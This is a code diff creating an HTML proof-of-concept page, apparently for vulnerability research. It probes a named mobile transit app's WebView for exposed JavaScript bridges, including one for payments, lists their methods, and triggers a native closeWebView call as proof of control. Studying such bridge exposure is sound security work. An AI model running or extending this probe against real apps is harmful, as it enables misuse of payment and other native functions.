@@ -1,21 +1,44 @@
-<script>
-    // 1. Try to close the WebView (Native call)
-    setTimeout(() => {
-        try {
-            mobile.closeWebView();
-            console.log("Success: mobile.closeWebView called");
-        } catch(e) {
-            console.log("Failed: " + e);
-        }
-    }, 2000);
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Moovit Exploitation PoC</title>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #1a1a1a; color: #fff; }
+        .log { background: #000; padding: 10px; border: 1px solid #444; color: #0f0; min-height: 200px; }
+    </style>
+</head>
+<body>
+    <h1>Moovit Hunter Engine</h1>
+    <p>Target: <code>com.tranzmate</code></p>
+    <div id="status">Scanning for bridges...</div>
+    <div class="log" id="log"></div>
 
-    // 2. Check for other powerful bridges (Ticketing/Payments)
-    const bridges = ["moovit", "moovit_gpay", "mobile"];
-    bridges.forEach(b => {
-        if (window[b]) {
-            alert("Vulnerable! Bridge found: " + b);
-            // Log all methods available on the bridge
-            console.log("Methods on " + b + ":", Object.keys(window[b]));
+    <script>
+        function log(msg) {
+            const l = document.getElementById('log');
+            l.innerHTML += "> " + msg + "<br>";
         }
-    });
-</script>
+
+        const bridges = ["mobile", "moovit", "moovit_gpay", "Braze", "Appboy"];
+        
+        window.onload = () => {
+            log("Analysis started...");
+            
+            bridges.forEach(b => {
+                if (window[b]) {
+                    log("<span style='color:red'>[VULNERABLE] Bridge found: " + b + "</span>");
+                    log("Exposed Methods: " + Object.keys(window[b]).join(", "));
+                    
+                    // Attempt a harmless native call to prove control
+                    if (b === "mobile" && window[b].closeWebView) {
+                        log("Triggering closeWebView() in 5 seconds...");
+                        setTimeout(() => { window[b].closeWebView(); }, 5000);
+                    }
+                } else {
+                    log("Bridge not found: " + b);
+                }
+            });
+        };
+    </script>
+</body>
+</html>
